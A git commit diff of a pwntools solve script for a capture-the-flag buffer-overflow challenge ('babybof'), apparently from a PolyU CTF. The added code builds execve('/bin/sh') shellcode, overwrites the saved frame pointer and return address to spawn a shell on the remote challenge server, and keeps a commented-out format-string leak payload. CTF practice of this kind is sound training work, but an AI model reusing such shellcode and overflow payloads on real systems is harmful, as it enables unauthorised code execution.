9c9412e7b83f615cc9a99ce5d4291cc3fe6a6cb7
curiocunngios <curiocunngios@gmail.com>
2025-04-19 10:52:16 -0400

    Added puzzle again

--- puctf/babybof/solve.py
+++ puctf/babybof/solve.py
@@ -1,18 +1,54 @@
 from pwn import * 
 
 s = '''
+b * vuln+77 
 '''
 
 binary = './chal'
+elf = ELF(binary)
+
 p = process(binary)
-
+p = remote('chal.polyuctf.com', 32499)
+context.arch = 'amd64'
 win = 0x40123b
-payload = b'A' * 0x40
-payload += b'B' * 8
-payload += p64(win)
+elf_base = elf.bss() + 0x100
+gets = 0x00000000004012bc
+printf = 0x401288
+fopen = 0x0000000000401256
+shellcode = asm('''
+    xor rax, rax
+    xor rsi, rsi
+    xor rdx, rdx
+    
 
+    push rax              
+    mov rdi, 0x68732f6e69622f 
+    push rdi
+    
+
+    mov rdi, rsp          
+
+
+
+    mov al, 0x3b       
+    
+    syscall
+''')
+
+print(len(shellcode))
+
+payload = shellcode
+payload += b'A' * (0x40 - len(shellcode))
+payload += p64(elf_base + 0x40)
+payload += p64(fopen)
+
+#gdb.attach(p, s)
 p.sendline(payload)
-gdb.attach(p, s)
 
-
+'''
+payload2 = b"%p-%p-%p-%p-%p-%p-"
+payload2 += b'A' * (0x48 - len(payload2))
+payload2 += p64(printf)
+p.sendline(payload2)
+'''
 p.interactive()
